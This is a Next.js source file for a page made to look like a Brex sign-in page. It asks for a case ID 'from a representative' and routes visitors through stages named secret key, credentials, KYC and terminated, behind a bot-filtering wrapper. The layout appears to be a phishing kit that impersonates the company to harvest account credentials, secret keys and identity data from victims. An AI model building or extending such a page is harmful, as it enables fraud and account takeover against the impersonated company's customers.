'use client';

/**
 * Brex Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 * Brex split-screen design — white theme with orange accent
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column: Login */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">

              {/* Global Error */}
              {fieldError && (
                <div className="alert-box">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" clipRule="evenodd"
                      d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                      fill="#b92d26" />
                  </svg>
                  <span>{fieldError}</span>
                </div>
              )}

              <h1>Sign in to your Brex account</h1>

              <form className="auth-form" onSubmit={handleSubmit} noValidate>

                <div className="o-form-fieldset">
                  <label htmlFor="case-id">Case ID</label>
                  <div className="input-wrapper">
                    <input
                      type="text"
                      id="case-id"
                      name="case-id"
                      autoComplete="off"
                      value={caseId}
                      onChange={(e) => {
                        setCaseId(e.target.value);
                        if (fieldError) setFieldError('');
                      }}
                      disabled={isLoading}
                    />
                  </div>
                </div>

                <div className="auth-actions">
                  <button type="submit" className="button-primary" disabled={isLoading}>
                    {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                    {isLoading ? 'Verifying...' : 'Next'}
                  </button>
                </div>
              </form>

              {/* Extra Info */}
              <div className="extra-info" style={{ marginTop: '16px' }}>
                <p className="not-customer">
                  If you received a direct link from a representative, please use that link instead.
                </p>
              </div>
            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing (Desktop Only) */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
